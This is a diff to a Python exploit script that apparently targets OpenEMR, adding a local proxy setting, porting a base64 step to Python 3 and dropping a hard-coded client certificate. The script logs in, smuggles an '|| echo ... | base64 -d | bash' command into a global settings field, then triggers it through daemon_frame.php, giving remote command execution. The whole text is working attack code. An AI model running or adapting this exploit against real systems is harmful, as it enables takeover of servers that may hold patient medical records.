@@ -56,6 +56,9 @@ load = "[>$<] ".replace(">", green).replace("<", clear)
 err = "[>-<] ".replace(">", red).replace("<", clear)
 intro = ascii.replace(">", green).replace("<", clear)
 
+
+proxy = {"http":"127.0.0.1:8080", "https":"127.0.0.1:8080"}
+
 print(intro)
 
 with requests.session() as s:
@@ -67,7 +70,7 @@ with requests.session() as s:
             }
     
     print(load + "Authenticating with " + args.user + ":" + args.password)
-    r = s.post(args.host + "/interface/main/main_screen.php?auth=login&site=default", data=login, verify=False)
+    r = s.post(args.host + "/interface/main/main_screen.php?auth=login&site=default", data=login, proxies=proxy, verify=False)
     if "login_screen.php?error=1&site=" in r.text:
         print(err + "Failed to Login.")
         sys.exit(0)
@@ -137,11 +140,14 @@ with requests.session() as s:
         p.update({a[0]: a[1]})
    
     # Linux only, but can be easily modified for Windows.
-    _cmd = "|| echo " + base64.b64encode(args.cmd) + "|base64 -d|bash"
+    _cmd = "|| echo " + base64.b64encode(args.cmd.encode("utf")).decode("utf") + "|base64 -d|bash"
     p.update({"form_284": _cmd})
-    
+
+
     print(load + "Injecting payload")
-    s.post(args.host + "/interface/super/edit_globals.php", data=p, cert=('/home/m3rl1n/Downloads/http-client.pem', '/home/m3rl1n/Downloads/http-client.key'), verify=False)
-    sp = s.get(args.host + "/interface/main/daemon_frame.php") # M4tt D4em0n w0z h3r3 ;PpPpp
+    s.post(args.host + "/interface/super/edit_globals.php", data=p, verify=False, proxies=proxy)
+    sp = s.get(args.host + "/interface/main/daemon_frame.php", proxies=proxy) # M4tt D4em0n w0z h3r3 ;PpPpp
     if sp.status_code == 200:
         print(load + "Payload executed")
+
+
